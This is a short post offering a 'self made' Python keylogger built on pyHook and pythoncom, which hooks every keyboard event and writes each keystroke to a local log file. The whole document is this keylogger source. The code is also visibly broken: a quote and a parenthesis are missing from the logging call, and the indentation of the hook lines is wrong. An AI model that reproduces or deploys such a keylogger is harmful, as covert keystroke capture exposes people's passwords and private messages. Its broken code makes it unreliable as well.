Self made Python keylogger using module PyHook,pythoncon and logging module .

import pyHook
import pythoncom
import logging

file_log = 'C:\\New\\log.txt'
def OnKeyboardEvent(event):
  logging.basicConfig(filename=file_log,level=logging.DEBUG,format=%(message)s'
  logging.log(10,chr(event.Ascii))
  return True
 hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown =  OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
 
                      
